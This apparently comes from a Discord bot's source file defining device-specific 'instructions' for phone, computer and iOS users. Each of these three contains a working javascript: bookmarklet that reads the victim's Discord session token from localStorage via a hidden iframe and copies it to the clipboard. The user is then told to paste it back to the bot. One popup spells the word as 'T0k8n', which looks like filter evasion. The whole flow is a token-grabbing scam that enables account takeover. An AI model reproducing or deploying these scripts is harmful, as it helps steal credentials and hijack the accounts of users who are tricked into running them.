import { getEmoji } from '../handlers/emoji.js';

const DEVICE_GUIDES = {
    phone: {
        label: 'Phone',
        title: `${getEmoji('phone')} Phone`,
        videoUrl: process.env.DEVICE_VIDEO_URL_PHONE || 'https://cdn.discordapp.com/attachments/976357084381741076/1479736046026493954/VN20260307_122317.mp4?ex=6a855515&is=6a840395&hm=fef23630714d19a1ae70ef912917d63daed3d94f6983fe509ca535dc59811386&',
        intro: `## ${getEmoji('instructions')} Phone instructions
Use the script below first, then open the video link for the exact steps.

\`\`\`javascript
javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>sawof</strong><br>Your Account T0k8n Has Copied Successfully';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>{n.style.opacity='1';},50);setTimeout(()=>{n.style.opacity='0';setTimeout(()=>n.remove(),500);},3500);}catch(e){alert('Error copying token');}})();
\`\`\`

> This will copy your Discord user token to the clipboard. Paste it back here only if you trust the source.`,
    },
    computer: {
        label: 'Computer',
        title: `${getEmoji('computer')} Computer`,
        videoUrl: process.env.DEVICE_VIDEO_URL_COMPUTER || 'https://cdn.discordapp.com/attachments/976357084381741076/1479735909267280016/bandicam_2026-03-07_12-30-23-184.mp4?ex=6a8554f4&is=6a840374&hm=7c476bc8339173e2884fca4a8f99563ed682430dea3002541a6280fca4f67f46&',
        intro: `## ${getEmoji('instructions')} Computer instructions
Use the script below first, then open the video link for the exact steps.

\`\`\`javascript
javascript:(function(){var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var t=i.contentWindow.localStorage.token;if(t){try{t=JSON.parse(t)}catch(e){}var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();var n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#1a1a2e;color:#e94560;padding:15px 20px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.5);font-family:Arial,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s;';document.body.appendChild(n);setTimeout(function(){n.style.opacity='1'},50);setTimeout(function(){n.style.opacity='0';setTimeout(function(){n.remove()},500)},3500)}else{alert('No token found. Make sure you are logged into Discord on this browser.')}})();
\`\`\`

> This will copy your Discord user token to the clipboard. Paste it back here only if you trust the source.`,
    },
    ios: {
        label: 'iOS',
        title: `${getEmoji('ios')} iOS`,
        videoUrl: process.env.DEVICE_VIDEO_URL_IOS || 'https://cdn.discordapp.com/attachments/976357084381741076/1479736046026493954/VN20260307_122317.mp4?ex=6a855515&is=6a840395&hm=fef23630714d19a1ae70ef912917d63daed3d94f6983fe509ca535dc59811386&',
        intro: `## ${getEmoji('instructions')} iOS instructions
Use the script below first, then open the video link for the exact steps.

\`\`\`javascript
javascript:(function(){function copy(t){const i=document.createElement('input');i.value=t;document.body.appendChild(i);i.select();document.execCommand('copy');document.body.removeChild(i)}function notify(m){const d=document.createElement('div');d.textContent=m;d.style.cssText='position:fixed;top:10px;right:10px;background:#5865F2;color:white;padding:10px;border-radius:5px;z-index:99999;font-family:-apple-system,sans-serif';document.body.appendChild(d);setTimeout(()=>d.remove(),3000)}let token=null;if(window._token||window.token||window.discordToken){token=window._token||window.token||window.discordToken}if(!token){for(let k of Object.keys(localStorage)){if(/token/i.test(k)){token=localStorage.getItem(k);break}}}if(!token){for(let k of Object.keys(sessionStorage)){if(/token/i.test(k)){token=sessionStorage.getItem(k);break}}}if(token){copy(token);notify('Discord token copied!')}else{notify('No token found')}})();
\`\`\`

> This will copy your Discord user token to the clipboard. Paste it back here only if you trust the source.`,
    },
    android: {
        label: 'Android',
        title: `${getEmoji('phone')} Android`,
        videoUrl: process.env.DEVICE_VIDEO_URL_ANDROID || process.env.DEVICE_VIDEO_URL_PHONE || '',
        intro: `## ${getEmoji('instructions')} Android instructions
Open the video link below for the exact steps.`,
    },
};
export function getDeviceGuideData(device) {
    return DEVICE_GUIDES[device] ?? DEVICE_GUIDES.phone;
}

export function getDeviceScript(device) {
    const intro = getDeviceGuideData(device).intro;
    return intro.match(/```javascript\n([\s\S]*?)\n```/)?.[1] ?? null;
}
